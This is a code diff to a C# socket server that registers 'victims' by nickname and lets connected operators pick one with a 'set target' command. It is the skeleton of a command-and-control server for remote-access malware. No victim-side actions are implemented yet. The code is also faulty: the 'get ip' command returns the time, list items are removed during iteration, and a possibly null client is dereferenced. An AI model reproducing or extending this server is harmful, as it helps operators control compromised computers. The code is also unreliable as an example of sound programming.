@@ -11,8 +11,8 @@ namespace Wubalubadubdub_Server
     class Program
     {
         private static Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        private static List<Socket> clients = new List<Socket>();
-        private static List<Socket> victims = new List<Socket>();
+        private static List<Client> clients = new List<Client>();
+        private static List<Victim> victims = new List<Victim>();
         private const int bufferSize = 2048;
         private const int PORT = 6969;
         private static byte[] buffer = new byte[bufferSize];
@@ -38,10 +38,10 @@ namespace Wubalubadubdub_Server
         
         private static void CloseAllSockets()
         {
-            foreach (Socket socket in clients)
+            foreach (Client c in clients)
             {
-                socket.Shutdown(SocketShutdown.Both);
-                socket.Close();
+                c.socket.Shutdown(SocketShutdown.Both);
+                c.socket.Close();
             }
             serverSocket.Close();
         }
@@ -54,22 +54,22 @@ namespace Wubalubadubdub_Server
             {
                 socket = serverSocket.EndAccept(asyncResult);
             }
-            catch (ObjectDisposedException) // I cannot seem to avoid this (on exit when properly closing sockets)
+            catch (ObjectDisposedException)
             {
                 return;
             }
             socket.Receive(buffer);
             string text = Encoding.ASCII.GetString(buffer);
-
-            if (text.Equals("client"))
+            
+            if (text.Contains("client"))
             {
-                clients.Add(socket);
+                clients.Add(new Client(socket));
                 Console.WriteLine("Client connected, waiting for request...");
             }
             else
             {
-                victims.Add(socket);
-                Console.WriteLine("Victim connected at "+socket.RemoteEndPoint.ToString().Split(':')[0]);
+                victims.Add(new Victim(socket, text.Split('~')[0]));
+                Console.WriteLine("Victim '" + text.Split('~')[0] + "' connected at "+socket.RemoteEndPoint.ToString().Split(':')[0]);
             }
             
             socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
@@ -90,34 +90,82 @@ namespace Wubalubadubdub_Server
                 Console.WriteLine("Client forcefully disconnected");
                 // Don't shutdown because the socket may be disposed and its disconnected anyway.
                 socket.Close(); 
-                clients.Remove(socket);
+                foreach (Client c in clients)
+                {
+                    if (c.socket == socket)
+                    {
+                        clients.Remove(c);
+                    }
+                }
                 return;
             }
 
             byte[] recBuf = new byte[received];
             Array.Copy(buffer, recBuf, received);
             string text = Encoding.ASCII.GetString(recBuf);
-            Console.WriteLine("Received Text: " + text);
+            Console.WriteLine("Received Command: " + text);
 
-            if (text.ToLower() == "get time")
+            Client client = null;
+            foreach (Client c in clients)
             {
-                Console.WriteLine("Text is a get time request");
-                byte[] data = Encoding.ASCII.GetBytes(DateTime.Now.ToLongTimeString());
-                socket.Send(data);
-                Console.WriteLine("Time sent to client");
+                if (c.socket == socket)
+                {
+                    client = c;
+                }
+            }
+
+            if (text.ToLower().Contains("set target"))
+            {
+                Victim old = client.target;
+                String targetName = text.Split(' ')[2];
+                foreach (Victim v in victims)
+                {
+                    if (v.nickName.Equals(targetName))
+                    {
+                        client.target = v;
+                        byte[] data = Encoding.ASCII.GetBytes("Target set to "+targetName);
+                        socket.Send(data);
+                    }
+                }
+
+                if (client.target == old)
+                {
+                    byte[] data = Encoding.ASCII.GetBytes("No target found");
+                    socket.Send(data);
+                    client.target = null;
+                }
+            }
+            
+            else if (client.target != null)
+            {
+                if (text.ToLower() == "get ip")
+                {
+                    Console.WriteLine("Text is a get time request");
+                    byte[] data = Encoding.ASCII.GetBytes(DateTime.Now.ToLongTimeString());
+                    socket.Send(data);
+                    Console.WriteLine("Time sent to client");
+                }
+                else
+                {
+                    Console.WriteLine("Invalid Command entered");
+                    byte[] data = Encoding.ASCII.GetBytes("Invalid Command");
+                    socket.Send(data);
+                }
             }
             else if (text.ToLower() == "exit")
             {
                 socket.Shutdown(SocketShutdown.Both);
                 socket.Close();
-                clients.Remove(socket);
+
+                clients.Remove(client);
+                
                 Console.WriteLine("Client disconnected");
                 return;
             }
             else
             {
-                Console.WriteLine("Invalid Command entered");
-                byte[] data = Encoding.ASCII.GetBytes("Invalid Command");
+                Console.WriteLine("No Target set");
+                byte[] data = Encoding.ASCII.GetBytes("No Target set");
                 socket.Send(data);
             }
 
